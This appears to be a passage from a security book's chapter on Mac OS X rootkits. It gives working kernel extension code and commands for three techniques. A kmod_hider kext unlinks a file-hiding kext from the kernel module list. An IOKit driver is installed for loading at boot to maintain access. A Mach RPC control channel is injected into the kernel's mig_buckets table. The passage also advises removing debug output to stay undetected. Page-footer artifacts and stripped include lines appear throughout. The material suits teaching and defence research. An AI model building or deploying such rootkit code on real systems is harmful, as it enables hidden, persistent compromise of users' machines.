or bad, is that the module can never be unloaded, since the code responsible for
unloading a module also uses this method for locating modules.
The main obstacle, like in the sysent table case, is fi nding the head of the
linked list, as kmod is not an exported symbol. Looking at the kernel code
that is executed when a new module is loaded, it becomes clear that each new
module is added to the beginning of the linked list.
kern_return_t
kmod_create_internal(kmod_info_t *info, kmod_t *id)
{
…
info->id = kmod_index++;
info->reference_count = 0;
info->next = kmod;
kmod = info;
…
In this case, the new module is called info. Its next pointer is set to kmod (the
old head of the list) and kmod is set to the new head of the list. One approach
to remove this module from the linked list would be simply to fi nd the kmod
pointer and set it to the second module’s information. An easier way is to use a
second kernel module. Simply create a new kernel module (named kmod_hider)
that removes the fi rst kernel module from the linked list, as follows.
1. Load hidefi le—or whatever kext you are trying to hide.
2. Load kmod_hider (kmod_hider’s next pointer points at hidefi le). kmod_
hider sets its next pointer to the module after hidefi le.
3. Remove kmod_hider.
When kmod_hider is removed, the new head of the list will be the module
after hidefi le, and hidefi le will no longer be in the linked list. All of this is
done without ever knowing the value of kmod. Here is the source code for
kmod_hider.
#include 
#include 
kern_return_t kmod_hider_start (kmod_info_t * ki, void * d) {
printf(“In start\n”);
ki->next = ki->next->next;
return KERN_SUCCESS;
}
9955336633cc1122..iinndddd 334444 11//2255//0099 44::4433::2211 PPMM
Chapter 12 ■ Rootkits 345
kern_return_t kmod_hider_stop (kmod_info_t * ki, void * d) {
printf(“In stop\n”);
return KERN_SUCCESS;
}
Here is the process in action.
$ ls
Writing A Template, Sample, Instructions macosx-book
fuzzing-book testfile.txt
haxortime.txt
Here is the fi le that needs to be hidden. Install both kernel extensions.
$ sudo kextload /tmp/hidefile.kext
kextload: /tmp/hidefile.kext loaded successfully
$ sudo kextload /tmp/kmod_hider.kext
kextload: /tmp/kmod_hider.kext loaded successfully
$ kextstat | tail -3
117 0 0xc18000 0x10000 0xf000 com.parallels.kext.vmmain
(3.0) 
118 0 0x53308000 0x3000 0x2000 com.parallels.kext.Pvsvnic
(3.0) 
120 0 0x343db000 0x2000 0x1000
com.yourcompany.kext.kmod_hider (1.0.0d1) 
The hidefi le module (with index 119) doesn’t appear since it has been removed
from the linked list. All that remains is to remove the hider itself.
$ sudo kextunload /tmp/kmod_hider.kext
kextunload: unload kext /tmp/hello-kernel.kext succeeded
Verify that life is good.
$ kextstat | tail -3
116 0 0xc33000 0x14000 0x13000
com.parallels.kext.hypervisor (3.0) 
117 0 0xc18000 0x10000 0xf000 com.parallels.kext.vmmain
(3.0) 
118 0 0x53308000 0x3000 0x2000 com.parallels.kext.Pvsvnic
(3.0) 
$ ls
Writing A Template, Sample, Instructions macosx-book
fuzzing-book testfile.txt
Yes, the module is still working since the fi le is hidden, and it doesn’t show
up in the module list. One fi nal note: Don’t forget to remove all those printf
statements from the code if you really want to remain undetected.
9955336633cc1122..iinndddd 334455 11//2255//0099 44::4433::2211 PPMM
346 Part IV ■ Post-Exploitation
Maintaining Access across Reboots
So far you have always loaded the rootkit manually. It is desirable that it is
always installed, even immediately following a reboot by the user.
When the system is booting up, the BootX booter needs to mount the root
fi le system. To do this, it must load some kexts. The boot loader fi rst attempts to
load a previously cached set of device drivers. If the cache is missing, it searches
/System/Library/Extensions for any kext whose OSBundleRequired value is
set to the appropriate value in its Info.plist fi le. The possible values include the
following:
■ Root—The kext is required to mount root of any kind.
■ Network-Root—The kext is required to mount root on a remote fi le
volume.
■ Local-Root—This kext is required to mount root on a local volume.
■ Console—This kext is required for console support.
■ Safe Boot—This kext is required except in safe mode.
From a perspective of trying to maintain presence on the machine, the choice
should probably be Root. This will force the kernel extension to be loaded at
boot time, even during safe mode or single-user mode.
One drawback is that the above technique to have drivers loaded at boot time
only works for IOKit drivers as opposed to generic kernel extensions, like all
the code in this chapter up to this point. IOKit drivers are written in C++ and
are slightly harder to set up. The following is the equivalent hello world IOKit
driver. First, a simple header fi le:
#include 
class com_MyTutorial_driver_HelloIOKit : public IOService
{
OSDeclareDefaultStructors(com_MyTutorial_driver_HelloIOKit)
public:
virtual bool init(OSDictionary *dictionary = 0);
virtual void free(void);
virtual IOService *probe(IOService *provider, SInt32
*score);
virtual bool start(IOService *provider);
virtual void stop(IOService *provider);
};
Here is the C++ fi le:
#include 
#include “HelloIOKit.h”
extern “C” {
#include //This is for debugging purposes ONLY
}
9955336633cc1122..iinndddd 334466 11//2255//0099 44::4433::2211 PPMM
Chapter 12 ■ Rootkits 347
// Define my superclass
#define super IOService
// REQUIRED! This macro defines the class’s constructors,
destructors,
// and several other methods I/O Kit requires. Do NOT use super as
the
// second parameter. You must use the literal name of the
superclass.
OSDefineMetaClassAndStructors(com_MyTutorial_driver_HelloIOKit,
IOService)
bool com_MyTutorial_driver_HelloIOKit::init(OSDictionary *dict)
{
bool res = super::init(dict);
IOLog(“Initializing\n”);
return res;
}
void com_MyTutorial_driver_HelloIOKit::free(void)
{
IOLog(“Freeing\n”);
super::free();
}
IOService *com_MyTutorial_driver_HelloIOKit::probe(IOService
*provider, SInt32
*score)
{
IOService *res = super::probe(provider, score);
IOLog(“Probing\n”);
return res;
}
bool com_MyTutorial_driver_HelloIOKit::start(IOService *provider)
{
bool res = super::start(provider);
IOLog(“Starting\n”);
return res;
}
void com_MyTutorial_driver_HelloIOKit::stop(IOService *provider)
{
IOLog(“Stopping\n”);
super::stop(provider);
}
Finally, the Info.plist fi le:
CFBundleDevelopmentRegion
English
CFBundleExecutable
${EXECUTABLE_NAME}
CFBundleName
${PRODUCT_NAME}
CFBundleIconFile
CFBundleIdentifier
com.MyTutorial.driver.HelloIOKit
CFBundleInfoDictionaryVersion
6.0
CFBundlePackageType
KEXT
CFBundleSignature
????
CFBundleVersion
1.0.0d1
IOKitPersonalities
HelloIOKit
CFBundleIdentifier
com.MyTutorial.driver.HelloIOKit
IOClass
com_MyTutorial_driver_HelloIOKit
IOKitDebug
65535
IOMatchCategory
com_MyTutorial_driver_HelloIOKit
IOProviderClass
IOResources
IOResourceMatch
IOKit
OSBundleLibraries
com.apple.kernel.iokit
6.9.9
com.apple.kernel.libkern
6.9.9
com.apple.kernel.mach
6.9.9
9955336633cc1122..iinndddd 334488 11//2255//0099 44::4433::2211 PPMM
Chapter 12 ■ Rootkits 349
It is not diffi cult to convert the early examples from this chapter from generic
kernel extensions to IOKit drivers. Starting from this example, if you want the
extension to be loaded by the operating system at startup, add the following to
the extensions Info.plist fi le:
OSBundleRequired
Root
Then copy it to the location of the system extensions.
$ sudo cp -r HelloIOKit.kext /System/Library/Extensions
$ sudo chown -R root:wheel /System/Library/Extensions/HelloIOKit.kext
Finally, touch the directory so that the system updates the cache.
$ sudo touch /System/Library/Extensions
To test these changes, reboot the system and see whether the extension is
automatically loaded. Indeed it is.
$ kextstat | grep -C 2 Hello
104 0 0x34c59000 0x7000 0x6000 com.apple.iokit.CHUDUtils
(200) 
105 0 0x34aba000 0x3000 0x2000
com.apple.Dont_Steal_Mac_OS_X (6.0.2) 
106 0 0x34acb000 0x2000 0x1000
com.MyTutorial.driver.HelloIOKit (1.0.0d1) 
107 0 0x34e1c000 0x10000 0xf000
com.apple.driver.DiskImages (192.1) 
108 0 0x34e2c000 0x6000 0x5000 com.parallels.kext.Pvsnet
(3.0) 
Notice that the extension is no longer the last module loaded.
Controlling the Rootkit
One of the most interesting things about Mac OS X is its multitude of disparate
kernel interfaces. In addition to BSD and Mach system calls, sysctls, ioctls, and
IOKit user clients, there are also in-kernel Mach RPC servers. Many of the histor-
ical Mach servers now live in the kernel rather than in separate server processes.
Since this is a relatively obscure kernel facility, it makes it an interesting place to
hide a rootkit control channel. It also makes it easy to call these functions from
a user-land control utility, because the MIG-generated stub routines handle all
of the type conversion and messaging. In this section we will demonstrate how
to add an in-kernel RPC control channel to the rootkit.
9955336633cc1122..iinndddd 334499 11//2255//0099 44::4433::2211 PPMM
350 Part IV ■ Post-Exploitation
Creating the RPC Server
First we will create a simple MIG defi nitions fi le. In this fi le we declare that we
are defi ning a subsystem called krpc with subsystem identifi er 1337 that will
run with the server in the kernel. We defi ne a single routine, krpc_ping. Every
Mach RPC routine must take a mach port as its fi rst argument that is used to
indicate the server to which the request will be sent.
subsystem KernelServer krpc 1337;
#include 
#include 
routine krpc_ping(p : mach_port_t);
When we process this fi le with /usr/bin/mig, it generates a few new fi les:
krpc.h, krpcServer.c, and krpcUser.c. In our kernel rootkit, we will include
krpcServer.c, which implements the in-kernel server-side RPC stubs. We will
also need to include krpc.h and implement the server-side RPC routines in C.
The implementations of RPC routines look similar to the routine declarations
in the defs fi le, but with the MIG types translated to C language types. For an
exact declaration, we can check the generated header fi le (krpc.h).
kern_return_t krpc_ping
(
mach_port_t p
);
Now in our rootkit we will implement this function and the server stubs will
call it whenever they receive an RPC request for it.
kern_return_t krpc_ping(mach_port_t p)
{
printf(“ping\n”);
return KERN_SUCCESS;
}
Injecting Kernel RPC Servers
The Mac OS X kernel does not support dynamically adding or removing in-
kernel Mach RPC servers. The in-kernel RPC-server dispatch table is initialized
once and never modifi ed afterwards. Since we are writing a rootkit, however,
we expect to break the rules a little bit.
This in-kernel RPC-server dispatch table is a hash table called mig_buckets
in osfmk/kern/ipc_kobject.c. The kernel receives incoming mach messages on
9955336633cc1122..iinndddd 335500 11//2255//0099 44::4433::2211 PPMM
Chapter 12 ■ Rootkits 351
its host server port and dispatches them based on the subroutine identifi ers in
their Mach header through this hash table.
Our rootkit injects its RPC server by directly modifying the mig_buckets
hash table. The functions to add and remove the RPC server from the table are
shown in the following code, and are called by our Kernel Extension start and
stop functions.
int inject_subsystem(const struct mig_subsystem * mig)
{
mach_msg_id_t h, i, r;
// Insert each subroutine into mig_buckets hash table
for (i = mig->start; i end; i++) {
mig_hash_t* bucket;
h = MIG_HASH(i);
do {
bucket = &mig_buckets[h % MAX_MIG_ENTRIES];